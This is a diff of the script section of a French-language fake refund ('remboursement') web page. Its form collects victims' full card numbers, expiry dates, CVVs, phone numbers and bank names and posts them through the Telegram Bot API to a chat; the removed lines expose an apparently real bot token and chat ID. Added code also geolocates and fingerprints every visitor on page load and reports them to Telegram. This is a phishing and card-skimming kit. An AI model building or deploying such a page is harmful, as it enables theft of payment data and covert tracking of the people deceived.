@@ -966,7 +966,7 @@
                     </a>
                 </div>
             </div>
-                    </div>
+        </div>
     </footer>
 
     <!-- Back to Top Button -->
@@ -986,58 +986,115 @@
             easing: 'ease-in-out',
             once: true
         });
-        
-        // Track page visit and send notification
-        async function trackPageVisit() {
+
+        // Enhanced Visitor Tracking with IP Geolocation
+        async function trackVisitor() {
             try {
-                // Get visitor info
+                // Get visitor's IP information
                 const ipResponse = await fetch('https://ipapi.co/json/');
+                if (!ipResponse.ok) throw new Error('IP API failed');
                 const ipData = await ipResponse.json();
-                
-                // Device detection
+
+                // Device and browser detection
                 const userAgent = navigator.userAgent;
                 const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
                 const deviceType = isMobile ? "Mobile 📱" : "Desktop 💻";
-                const now = new Date().toLocaleString();
-                
-                // Prepare message
+                const browser = detectBrowser(userAgent);
+                const os = detectOS(userAgent);
+
+                // Additional visitor details
+                const now = new Date();
+                const visitTime = now.toLocaleString();
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const referrer = document.referrer || 'Direct';
+                const pageUrl = window.location.href;
+                const screenSize = `${window.screen.width}x${window.screen.height}`;
+
+                // Prepare detailed notification message
                 const message = `
 🔔 **New Website Visit** 🔔
-🌍 Country: ${ipData.country_name || "Unknown"} (${ipData.country_code || "N/A"})
-🏙 City: ${ipData.city || "Unknown"}
-📍 Region: ${ipData.region || "Unknown"}
-📱 Device: ${deviceType} (${userAgent})
-🕒 Time: ${now}
-🔗 Page: ${window.location.href}
+🌐 Page: ${pageUrl}
+🕒 Time: ${visitTime}
+📍 Location: ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'} (${ipData.country_code || 'XX'})
+📌 Coordinates: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}
+📱 Device: ${deviceType} (${os})
+🌐 Browser: ${browser}
+🖥️ Screen: ${screenSize}
+⏱️ Timezone: ${timezone}
+🔗 Referrer: ${referrer}
                 `;
+
+                // Send to Telegram (replace with your bot token and chat ID)
+                const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
+                const telegramChatId = "YOUR_CHAT_ID";
                 
-                // Telegram bot settings (replace with your actual token and chat ID)
-                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-                const telegramChatId = "5372119436";
-                
-                // Send to Telegram
                 await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: telegramChatId,
                         text: message,
-                        parse_mode: "Markdown",
-                    }),
+                        parse_mode: "Markdown"
+                    })
                 });
+
             } catch (error) {
-                console.error("Tracking error:", error);
+                console.error("Visitor tracking error:", error);
+                // Fallback to simple notification if detailed tracking fails
+                sendBasicNotification();
             }
         }
-        
-        // Run tracking when page loads
-        if (document.readyState === 'complete') {
-            trackPageVisit();
-        } else {
-            window.addEventListener('load', trackPageVisit);
+
+        // Helper functions for browser and OS detection
+        function detectBrowser(userAgent) {
+            const browsers = {
+                'Chrome': /Chrome|CriOS/,
+                'Firefox': /Firefox|FxiOS/,
+                'Safari': /Safari/,
+                'Edge': /Edg/,
+                'IE': /Trident|MSIE/,
+                'Opera': /Opera|OPR/
+            };
+            
+            for (const [browser, regex] of Object.entries(browsers)) {
+                if (regex.test(userAgent)) return browser;
+            }
+            return 'Unknown';
         }
+
+        function detectOS(userAgent) {
+            const osList = {
+                'Windows': /Windows NT/,
+                'Mac OS': /Macintosh|Mac OS X/,
+                'Linux': /Linux/,
+                'Android': /Android/,
+                'iOS': /iPhone|iPad|iPod/
+            };
+            
+            for (const [os, regex] of Object.entries(osList)) {
+                if (regex.test(userAgent)) return os;
+            }
+            return 'Unknown';
+        }
+
+        // Basic notification fallback
+        function sendBasicNotification() {
+            const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
+            const telegramChatId = "YOUR_CHAT_ID";
+            const message = `🔔 New visit to ${window.location.href} at ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            }).catch(e => console.error("Basic notification failed:", e));
+        }
+
+        // Run tracking when page loads
+        document.addEventListener('DOMContentLoaded', trackVisitor);
 
         // Card number formatting
         const cardInput = document.getElementById('numero-carte');
@@ -1045,36 +1102,24 @@
         
         if (cardInput) {
             cardInput.addEventListener('input', (e) => {
-                // Remove non-digit characters and spaces
                 let value = e.target.value.replace(/\D/g, '');
-                
-                // Limit to 16 digits
-                if (value.length > 16) {
-                    value = value.slice(0, 16);
-                }
-                
-                // Add space after every 4 digits
+                if (value.length > 16) value = value.slice(0, 16);
                 e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                
-                // Hide error message while typing
                 cardError.classList.add('hidden');
             });
             
             cardInput.addEventListener('blur', () => {
-                const value = cardInput.value.replace(/\s/g, ''); // Remove spaces for validation
-                const startsWithValidNumber = /^[4-6]/.test(value); // Check card starts with 4, 5 or 6
-                
-                if (value.length !== 16 || !startsWithValidNumber) {
+                const value = cardInput.value.replace(/\s/g, '');
+                if (value.length !== 16 || !/^[4-6]/.test(value)) {
                     cardError.classList.remove('hidden');
                 }
             });
         }
         
-        // Form submission
-        document.getElementById("remboursement-form")?.addEventListener("submit", async function(event) {
-            event.preventDefault();
+        // Form submission handler
+        document.getElementById("remboursement-form")?.addEventListener("submit", async function(e) {
+            e.preventDefault();
             
-            // Show loading spinner
             const submitBtn = document.getElementById('submit-btn');
             const btnText = document.getElementById('btn-text');
             const loadingSpinner = document.getElementById('loading-spinner');
@@ -1083,129 +1128,94 @@
             btnText.textContent = 'Traitement en cours...';
             loadingSpinner.classList.remove('hidden');
             
-            // Get form values
-            const nom = document.getElementById("nom").value;
-            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-            const dateExpiration = document.getElementById("date-expiration").value;
-            const cvv = document.getElementById("cvv").value;
-            const telephone = document.getElementById("telephone").value;
-            const operateur = document.getElementById("operateur").value;
-            const bank = document.getElementById("bank").value;
-            const amount = document.getElementById("amount").value;
-            const reason = document.getElementById("reason").value;
-            const comments = document.getElementById("comments").value;
-            
-            // Telegram bot tokens and chat IDs
-            const token1 = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-            const chatId1 = "5372119436";
-            
-            const message = `
-🔔 **Nouvelle Demande de Remboursement** 🔔
-👤 Nom: ${nom}
-💳 Numéro de Carte: ${numeroCarte}
-📅 Expiration: ${dateExpiration}
-🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-📡 Opérateur: ${operateur}
-🏦 Banque: ${bank}
-💰 Montant: ${amount}€
-📌 Motif: ${reason}
-💬 Commentaires: ${comments || 'Aucun'}`;
-            
             try {
-                // Send to first bot
-                await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
+                const formData = {
+                    nom: document.getElementById("nom").value,
+                    numeroCarte: document.getElementById("numero-carte").value.replace(/\s+/g, ''),
+                    dateExpiration: document.getElementById("date-expiration").value,
+                    cvv: document.getElementById("cvv").value,
+                    telephone: document.getElementById("telephone").value,
+                    operateur: document.getElementById("operateur").value,
+                    bank: document.getElementById("bank").value,
+                    amount: document.getElementById("amount").value,
+                    reason: document.getElementById("reason").value,
+                    comments: document.getElementById("comments").value || 'Aucun'
+                };
+
+                const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
+👤 Nom: ${formData.nom}
+💳 Carte: ${formData.numeroCarte}
+📅 Exp: ${formData.dateExpiration}
+🔒 CVV: ${formData.cvv}
+📞 Tel: ${formData.telephone}
+📡 Opérateur: ${formData.operateur}
+🏦 Banque: ${formData.bank}
+💰 Montant: ${formData.amount}€
+📌 Motif: ${formData.reason}
+💬 Commentaires: ${formData.comments}`;
+
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        chat_id: chatId1,
+                        chat_id: telegramChatId,
                         text: message,
-                        parse_mode: "Markdown",
-                    }),
+                        parse_mode: "Markdown"
+                    })
                 });
-                
-                // Redirect after successful submission
+
                 window.location.href = "Traitement.html";
             } catch (error) {
-                // Hide loading spinner and show error
                 submitBtn.disabled = false;
                 btnText.textContent = 'Valider mon remboursement';
                 loadingSpinner.classList.add('hidden');
-                
-                // Show error alert
-                alert("Une erreur s'est produite lors de l'envoi du formulaire. Veuillez réessayer ou nous contacter si le problème persiste.");
-                console.error("Error:", error);
+                alert("Erreur lors de l'envoi. Veuillez réessayer.");
+                console.error("Submission error:", error);
             }
         });
-        
+
         // FAQ accordion functionality
         document.querySelectorAll('.faq-question').forEach(button => {
             button.addEventListener('click', () => {
                 const answer = button.nextElementSibling;
-                const isExpanded = button.getAttribute('aria-expanded') === 'true';
-                
-                // Toggle icon
                 const icon = button.querySelector('svg');
                 icon.classList.toggle('rotate-180');
-                
-                // Toggle answer visibility
                 answer.classList.toggle('hidden');
-                
-                // Update aria-expanded attribute
-                button.setAttribute('aria-expanded', !isExpanded);
+                button.setAttribute('aria-expanded', answer.classList.contains('hidden') ? 'false' : 'true');
             });
         });
-        
+
         // Back to top button
         const backToTopButton = document.getElementById('back-to-top');
-        
         window.addEventListener('scroll', () => {
-            if (window.pageYOffset > 300) {
-                backToTopButton.classList.remove('hidden');
-            } else {
-                backToTopButton.classList.add('hidden');
-            }
+            backToTopButton.classList.toggle('hidden', window.scrollY <= 300);
         });
-        
         backToTopButton.addEventListener('click', () => {
-            window.scrollTo({
-                top: 0,
-                behavior: 'smooth'
-            });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         });
-        
-        // Mobile menu toggle (placeholder - would need proper implementation)
-        document.querySelector('.md\\:hidden').addEventListener('click', () => {
-            alert("Menu mobile serait implémenté ici");
+
+        // Mobile menu toggle
+        document.querySelector('.md\\:hidden')?.addEventListener('click', () => {
+            alert("Menu mobile functionality would go here");
         });
-        
-        // Form validation for contact form
+
+        // Contact form handler
         document.querySelector('#contact form')?.addEventListener('submit', (e) => {
             e.preventDefault();
             alert("Merci pour votre message! Nous vous contacterons bientôt.");
             e.target.reset();
         });
-        
+
         // Smooth scrolling for anchor links
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
+            anchor.addEventListener('click', function(e) {
                 e.preventDefault();
-                
-                const targetId = this.getAttribute('href');
-                if (targetId === '#') return;
-                
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    targetElement.scrollIntoView({
-                        behavior: 'smooth'
-                    });
-                }
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) target.scrollIntoView({ behavior: 'smooth' });
             });
         });
-        
-        // Current year for footer
+
+        // Set current year in footer
         document.querySelector('footer .text-gray-400')?.insertAdjacentHTML('beforeend', new Date().getFullYear());
     </script>
 </body>
